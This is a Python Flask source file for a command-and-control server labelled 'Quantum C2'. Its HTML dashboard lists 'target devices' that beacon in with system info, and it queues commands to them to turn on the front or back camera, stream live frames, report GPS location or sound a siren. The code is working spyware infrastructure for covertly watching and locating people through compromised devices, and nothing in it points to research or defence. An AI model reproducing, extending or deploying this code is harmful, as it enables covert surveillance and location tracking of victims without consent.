import os
import json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Persistent in-memory storage for serverless/worker
pending_commands = {}
latest_frames = {}
active_devices = {}

HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>Quantum C2 Real-Time Dashboard</title>
    <style>
        body { background: #080b10; color: #00ff66; font-family: monospace; padding: 20px; text-align: center; }
        h1 { color: #00e5ff; text-shadow: 0 0 10px #00e5ff; }
        .box { background: #0d1117; border: 1px solid #00ff66; padding: 20px; border-radius: 10px; max-width: 700px; margin: 20px auto; text-align: left; }
        button { background: #00ff66; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; border-radius: 5px; margin: 5px; }
        button:hover { background: #00e5ff; }
        textarea { width: 100%; height: 140px; background: #000; color: #00ff66; border: 1px solid #00ff66; padding: 10px; }
        input { width: 100%; padding: 10px; background: #000; color: #fff; border: 1px solid #00e5ff; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>⚡ QUANTUM REAL-TIME C2 DASHBOARD</h1>
    <p>Connected Render Python Backend Active</p>
    <div class="box">
        <h3>Active Target Devices:</h3>
        <ul id="deviceList">Loading...</ul>
        <hr style="border-color: #00ff66; margin: 15px 0;">
        <h3>Target Device ID:</h3>
        <input type="text" id="targetDevId" placeholder="Enter Device ID from list above">
        <br>
        <button onclick="sendCmd('front')">Front Cam</button>
        <button onclick="sendCmd('back')">Back Cam</button>
        <button onclick="sendCmd('stop')">Stop Stream</button>
        <button onclick="sendCmd('location')">GPS Location</button>
        <button onclick="sendCmd('siren')">Alarm Siren</button>

        <h3>Live Camera Feed:</h3>
        <img id="liveFrame" style="max-width: 100%; border: 2px solid #00e5ff; display:none; margin-bottom:10px;" />

        <h3>Console Output:</h3>
        <textarea id="console" readonly></textarea>
    </div>
    <script>
        function refreshDevices() {
            fetch('/api/devices')
                .then(res => res.json())
                .then(list => {
                    const ul = document.getElementById('deviceList');
                    ul.innerHTML = '';
                    if(list.length === 0) {
                        ul.innerHTML = '<li>No active devices connected yet.</li>';
                    }
                    list.forEach(dev => {
                        const li = document.createElement('li');
                        li.textContent = `${dev.deviceID} (Last seen: ${new Date(dev.lastSeen).toLocaleTimeString()})`;
                        ul.appendChild(li);
                    });
                }).catch(()=>{});
        }
        setInterval(refreshDevices, 3000);
        refreshDevices();

        function sendCmd(action) {
            const devId = document.getElementById('targetDevId').value.trim();
            if(!devId) { alert('Enter Device ID first'); return; }

            fetch(`/api/command?deviceID=${encodeURIComponent(devId)}&action=${action}`)
                .then(res => res.json())
                .then(data => {
                    document.getElementById('console').value += `\\n[SENT to ${devId}]: ${action} -> OK`;
                }).catch(err => alert('Error sending command'));
        }

        // Poll live frame
        setInterval(() => {
            const devId = document.getElementById('targetDevId').value.trim();
            if(!devId) return;
            fetch(`/api/latest_frame?deviceID=${encodeURIComponent(devId)}`)
                .then(res => res.json())
                .then(data => {
                    if(data.frame) {
                        document.getElementById('liveFrame').style.display = 'block';
                        document.getElementById('liveFrame').src = 'data:image/jpeg;base64,' + data.frame;
                    }
                }).catch(()=>{});
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_DASHBOARD)

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json or {}
    dev_id = data.get('deviceID')
    if dev_id:
        active_devices[dev_id] = {
            'deviceID': dev_id,
            'url': data.get('url', ''),
            'sysinfo': data.get('sysinfo', ''),
            'lastSeen': __import__('time').time() * 1000
        }
    return jsonify({'status': 'OK'})

@app.route('/api/devices', methods=['GET'])
def get_devices():
    import time
    now = time.time() * 1000
    # Clean inactive devices (> 5 mins)
    expired = [k for k, v in active_devices.items() if now - v['lastSeen'] > 300000]
    for k in expired:
        del active_devices[k]
    return jsonify(list(active_devices.values()))

@app.route('/api/command', methods=['GET'])
def queue_command():
    dev_id = request.args.get('deviceID')
    action = request.args.get('action')
    if dev_id and action:
        pending_commands[dev_id] = action
        return jsonify({'status': 'QUEUED', 'action': action})
    return jsonify({'error': 'Missing parameters'}), 400

@app.route('/api/command/poll', methods=['GET'])
def poll_command():
    dev_id = request.args.get('deviceID')
    if dev_id and dev_id in pending_commands:
        cmd = pending_commands.pop(dev_id)
        return jsonify({'command': cmd})
    return jsonify({'command': None})

@app.route('/api/upload_frame', methods=['POST'])
def upload_frame():
    data = request.json or {}
    dev_id = data.get('deviceID')
    frame = data.get('frame')
    if dev_id and frame:
        latest_frames[dev_id] = frame
        return jsonify({'status': 'OK'})
    return jsonify({'error': 'Missing data'}), 400

@app.route('/api/latest_frame', methods=['GET'])
def get_latest_frame():
    dev_id = request.args.get('deviceID')
    frame = latest_frames.get(dev_id)
    return jsonify({'frame': frame})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
